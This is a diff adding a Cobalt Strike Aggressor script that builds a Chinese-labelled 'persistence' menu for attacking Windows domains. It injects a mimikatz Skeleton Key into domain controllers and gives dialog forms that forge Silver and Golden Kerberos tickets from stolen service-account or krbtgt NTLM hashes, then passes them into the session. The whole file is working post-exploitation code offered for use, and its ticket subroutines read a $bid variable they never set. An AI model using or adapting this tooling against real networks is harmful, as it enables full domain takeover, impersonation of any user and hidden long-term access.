@@ -1,0 +1,48 @@
+menu "权限维持" {
+  item "Skeleton Key"{
+    $bid = $1['@'];
+    bmimikatz($bid , "misc::skeleton");
+  }
+
+  item "白银票据" {
+    $bid = $1['@'];
+		$dialog = dialog("白银票据", %(user => "administrator", domain => "xxxx.com", sid => "sid", target => "dc.xxxx.com", rc4 => "NTLM", service => "cifs", bid => $bid), &SilverTicket);
+    dialog_description($dialog, "生成白银票据，攻击者必须获得目标服务账号的密码ntml-hash值。");
+    drow_text($dialog, "domain", "域名: ");
+    drow_text($dialog, "sid", "sid: ");
+    drow_text($dialog, "target", "目标主机名: ");
+    drow_text($dialog, "rc4", "NTLM-hash: ");
+    drow_text($dialog, "service", "伪造的服务: ");
+    drow_text($dialog, "user", "伪造用户名: ");
+    dbutton_action($dialog, "运行");
+    dialog_show($dialog);
+  }
+  sub SilverTicket {
+    $user = $3['user'];
+    $domain = $3['domain'];
+    $sid = $3['sid'];
+    $target = $3['target'];
+    $rc4 = $3['rc4'];
+    $service = $3['service'];
+    bmimikatz($bid, "kerberos::golden /domain:$domain /sid:$sid /target:$target /rc4:$rc4 /service:$service /user:$user /ptt exit");
+  }
+
+  item "黄金票据" {
+    $bid = $1['@'];
+		$dialog = dialog("黄金票据", %(admin => "administrator", domain => "xxxx.com", sid => "sid", krbtgt => "NTLM", bid => $bid), &GoldenTicket);
+    dialog_description($dialog, "生成黄金票据，攻击者必须获得krbtgt账户的ntml-hash值。");
+    drow_text($dialog, "admin", "伪造用户名: ");
+    drow_text($dialog, "domain", "域名: ");
+    drow_text($dialog, "sid", "sid: ");
+    drow_text($dialog, "krbtgt", "krbtgt NTLM-hash: ");
+    dbutton_action($dialog, "运行");
+    dialog_show($dialog);
+  }
+  sub GoldenTicket {
+    $admin = $3['admin'];
+    $domain = $3['domain'];
+    $sid = $3['sid'];
+    $krbtgt = $3['krbtgt'];
+    bmimikatz($bid, "kerberos::golden /admin:$admin /domain:$domain /sid:$sid /krbtgt:$krbtgt /ptt exit");
+  }
+}
